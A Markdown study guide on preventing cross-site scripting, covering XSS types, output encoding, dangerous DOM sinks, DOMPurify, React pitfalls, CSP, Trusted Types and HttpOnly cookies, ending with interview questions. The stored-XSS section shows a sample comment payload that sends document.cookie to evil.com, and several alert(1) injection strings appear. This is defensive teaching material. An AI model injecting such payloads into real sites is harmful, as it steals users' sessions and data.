# XSS Prevention

## Overview

**Cross-Site Scripting (XSS)** lets an attacker run their JavaScript in another user's browser. That script runs with the victim's session. It can steal cookies, read the page, make requests as the user, or change what they see.

The root cause is always the same: **untrusted data ends up in a place the browser treats as code.** Prevention is also one idea: keep data as data — never let it become markup or script.

## Table of Contents

- [The Three Types of XSS](#the-three-types-of-xss)
- [The Core Rule: Context-Aware Output Encoding](#the-core-rule-context-aware-output-encoding)
- [DOM-based XSS and Dangerous Sinks](#dom-based-xss-and-dangerous-sinks)
- [Sanitizing Rich HTML with DOMPurify](#sanitizing-rich-html-with-dompurify)
- [How React Protects You (and Where It Doesn't)](#how-react-protects-you-and-where-it-doesnt)
- [Defense in Depth: CSP, Trusted Types, HttpOnly](#defense-in-depth-csp-trusted-types-httponly)
- [Interview Questions](#interview-questions)

## The Three Types of XSS

The difference is **where the payload comes from**, not what it does.

| Type             | Where the payload lives                       | Example trigger                          |
| ---------------- | --------------------------------------------- | ---------------------------------------- |
| **Reflected**    | In the request, echoed back in the response   | A crafted link in a phishing email       |
| **Stored**       | Saved in your database, served to many users  | A malicious blog comment                 |
| **DOM-based**    | Never reaches the server — pure client-side   | `innerHTML = location.hash`              |

### 💡 **Stored XSS is the most dangerous**

It runs for **every** visitor automatically. No link to click. One bad comment can hit thousands of users.

```typescript
// Attacker submits this as a "comment":
const payload =
  `<img src=x onerror="fetch('https://evil.com/c?'+document.cookie)">`;

// ❌ Vulnerable: raw value goes straight into HTML
function renderComment(text: string): string {
  return `<div class="comment">${text}</div>`; // payload runs for everyone
}
```

## The Core Rule: Context-Aware Output Encoding

The same input is dangerous in different ways depending on **where** you put it. Encode for the **exact context** where the value lands.

| Context           | Example                          | What to do                          |
| ----------------- | -------------------------------- | ----------------------------------- |
| **HTML body**     | `<div>HERE</div>`                | HTML-entity encode `< > & " '`      |
| **HTML attribute**| `<a title="HERE">`               | Encode + always quote the attribute |
| **JavaScript**    | `<script>var x = "HERE"</script>`| JS-string escape, or use JSON       |
| **URL**           | `<a href="/s?q=HERE">`           | `encodeURIComponent`                |
| **CSS**           | `style="width: HERE"`            | Avoid user input in CSS entirely    |

**HTML-context encoder:**

```typescript
function encodeHtml(input: string): string {
  return input
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;");
}

// '<script>alert(1)</script>' → '&lt;script&gt;alert(1)&lt;/script&gt;'
```

> ⚠️ **Don't write your own encoder in production.** Use your framework's built-in escaping (React, Angular, a template engine). The example above is to show the idea, not to ship.

### Special case: data inside inline `<script>` (SSR)

When you serialize state into the page for hydration, an attacker can break out of the string with `</script>`. Escape the unsafe characters in the JSON.

```typescript
// ✅ Safe: neutralize <, >, & before embedding JSON in HTML
function safeJson(data: unknown): string {
  return JSON.stringify(data)
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026");
}

const html = `<script>window.__STATE__ = ${safeJson(state)};</script>`;
```

## DOM-based XSS and Dangerous Sinks

Here the bug is entirely in your JavaScript. You read from an attacker-controlled **source** and write to a dangerous **sink**.

```typescript
// ❌ Source: URL param  →  Sink: innerHTML
const name: string =
  new URLSearchParams(location.search).get("name") ?? "";

document.querySelector("#hello")!.innerHTML = `Hi, ${name}!`;
// ?name=<img src=x onerror=alert(1)> → script runs
```

**Common sinks to avoid with untrusted data:**

```typescript
el.innerHTML = data;       // HTML injection
el.outerHTML = data;       // HTML injection
el.insertAdjacentHTML("beforeend", data);
document.write(data);      // HTML injection
eval(data);                // code execution
new Function(data);        // code execution
setTimeout(data, 0);       // code execution if data is a string
location.href = data;      // javascript: URLs
```

### ✅ Fix: use safe sinks

```typescript
const el = document.querySelector("#hello")!;

// textContent treats input as text, never as HTML
el.textContent = `Hi, ${name}!`;

// Building nodes is also safe
const div = document.createElement("div");
div.textContent = name; // cannot inject markup
```

**Key insight:**

> `innerHTML` parses HTML. `textContent` does not. If you don't need HTML, never reach for `innerHTML`.

## Sanitizing Rich HTML with DOMPurify

Sometimes you **must** render HTML you didn't write — a rich-text editor, a CMS body, markdown output. Encoding would break the formatting. You need **sanitization**: parse the HTML and strip anything dangerous.

`DOMPurify` is the standard. It removes `<script>`, event handlers like `onerror`, and `javascript:` URLs.

```typescript
import DOMPurify from "dompurify";

const dirty = '<img src=x onerror=alert(1)><p>Hello</p>';
const clean: string = DOMPurify.sanitize(dirty);
// → '<img src="x"><p>Hello</p>'  (onerror stripped)
```

**Allowlist what you actually need** — smaller surface, safer output:

```typescript
const clean: string = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ["p", "b", "i", "em", "strong", "a", "ul", "ol", "li"],
  ALLOWED_ATTR: ["href", "title"],
});
```

> ✨ **Sanitize on output, at render time** — not just on input. Sanitizing only on save can be bypassed if data enters your DB another way (imports, other endpoints, old rows).

## How React Protects You (and Where It Doesn't)

React escapes any value rendered as JSX text. This covers most XSS for free.

```typescript
function Greeting({ name }: { name: string }) {
  // Safe: React escapes `name` automatically
  return <h1>Hello, {name}!</h1>;
}
// name = "<script>alert(1)</script>" → rendered as harmless text
```

### The escape hatches that React does **not** protect

```typescript
import DOMPurify from "dompurify";

// 1. dangerouslySetInnerHTML — bypasses escaping. Always sanitize first.
function Article({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// 2. javascript: URLs in href/src
function SafeLink({ url, children }: { url: string; children: React.ReactNode }) {
  const safe = /^https?:\/\//i.test(url) ? url : "#";
  return <a href={safe}>{children}</a>;
}
```

**React's three blind spots:**

- ❌ `dangerouslySetInnerHTML` without sanitization
- ❌ `href` / `src` set to a `javascript:` URL
- ❌ Spreading unknown props onto an element (`{...userControlled}`)

## Defense in Depth: CSP, Trusted Types, HttpOnly

Encoding and sanitization are your first line. These add backup layers so a single mistake isn't fatal.

**Content Security Policy** — blocks injected scripts from running at all. See [03-csp-headers.md](./03-csp-headers.md).

```typescript
res.setHeader(
  "Content-Security-Policy",
  "default-src 'self'; script-src 'self'; object-src 'none'",
);
// An injected <script>alert(1)</script> is blocked even if it lands in the DOM
```

**Trusted Types** — a newer browser feature that makes dangerous sinks like `innerHTML` refuse plain strings. You must pass a value created by an approved policy, which forces sanitization through one chokepoint.

```typescript
// Enforce via header (Chromium-based browsers):
// Content-Security-Policy: require-trusted-types-for 'script';

const policy = trustedTypes.createPolicy("app-html", {
  createHTML: (input: string): string => DOMPurify.sanitize(input),
});

el.innerHTML = policy.createHTML(dirty); // string assignment would now throw
```

**HttpOnly cookies** — XSS can't read a cookie marked `HttpOnly`, so it can't steal the session even if it runs.

```typescript
res.cookie("sessionId", token, {
  httpOnly: true, // not visible to document.cookie
  secure: true, // HTTPS only
  sameSite: "strict",
});
```

> **Layered thinking:** Encode/sanitize so injection can't happen → CSP so injected code can't run → HttpOnly so a successful script can't grab the session.

## Interview Questions

**Q1: What are the three types of XSS?**

Reflected (payload in the request, echoed back), Stored (payload saved server-side, served to many users), and DOM-based (payload handled entirely in client JS, never hits the server). Stored is usually the most damaging because it runs for every visitor.

**Q2: Encoding vs. sanitization — when do you use each?**

- **Encoding** turns special characters into safe text (`<` → `&lt;`). Use it for plain text you display — names, comments, search terms.
- **Sanitization** parses HTML and removes dangerous parts. Use it only when you must render real HTML — rich-text or CMS content.

**Q3: How does React prevent XSS, and where does it fall short?**

React escapes all JSX text by default. It does **not** protect `dangerouslySetInnerHTML`, `javascript:` URLs in `href`/`src`, or spread props. Sanitize HTML with DOMPurify and validate URLs before using them.

**Q4: What is DOM-based XSS and why is it harder to catch?**

It happens when client JS reads an attacker-controlled source (URL, `postMessage`, `localStorage`) and writes it to a dangerous sink (`innerHTML`, `eval`). The payload never reaches the server, so server-side scanners and WAFs never see it. Fix it by using `textContent` and avoiding dangerous sinks.

**Q5: Does CSP replace output encoding?**

No. CSP is a **second** layer. Encoding stops injection; CSP stops injected code from running if encoding is missed somewhere. Use both — defense in depth.

**Q6: How does the HttpOnly flag help against XSS?**

It hides the cookie from JavaScript. XSS can still run code, but `document.cookie` won't return the session token, so the attacker can't exfiltrate it. It limits the blast radius — it doesn't prevent the XSS itself.

## Summary

**Prevention checklist:**

- [ ] Encode output for its exact context (HTML, attribute, JS, URL)
- [ ] Prefer `textContent` over `innerHTML`
- [ ] Sanitize unavoidable HTML with DOMPurify, at render time
- [ ] Never misuse `dangerouslySetInnerHTML`; validate `href`/`src` URLs
- [ ] Escape JSON embedded in inline `<script>` (SSR)
- [ ] Add CSP, and Trusted Types where supported
- [ ] Set `HttpOnly`, `Secure`, `SameSite` on session cookies

**Core principles:**

1. **Keep data as data** — never let input become markup or code.
2. **Encode for context** — the right escaping depends on where the value lands.
3. **Defense in depth** — encoding → CSP → HttpOnly, so one slip isn't game over.
4. **Use proven libraries** — DOMPurify, not hand-rolled regex.

---

[Back to README](./README.md) | [Next: CSRF Protection →](./02-csrf-protection.md)
</content>
</invoke>
